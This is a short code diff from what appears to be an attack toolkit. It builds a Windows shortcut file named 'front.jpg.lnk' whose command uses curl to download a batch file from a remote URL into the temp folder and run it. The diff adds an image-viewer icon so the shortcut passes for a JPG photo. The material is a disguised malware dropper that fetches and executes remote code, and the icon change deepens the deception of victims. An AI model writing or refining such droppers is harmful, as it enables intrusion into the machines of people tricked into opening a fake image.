@@ -61,6 +61,8 @@ def pyration10(baseUrl) -> List[AceRoute]:
         arguments = "/c curl -k \"{}\" -o \"%tmp%/front.bat\" & cmd /c \"%tmp%/front.bat\"".format(
             baseUrl + '/pyration10/front.txt',
         ),
+        iconPath="C:\\Windows\\System32\\imageres.dll",
+        iconIndex=67
     )
     lnkFile: AceFile = makeAceFile('front.jpg.lnk', lnkData)
 
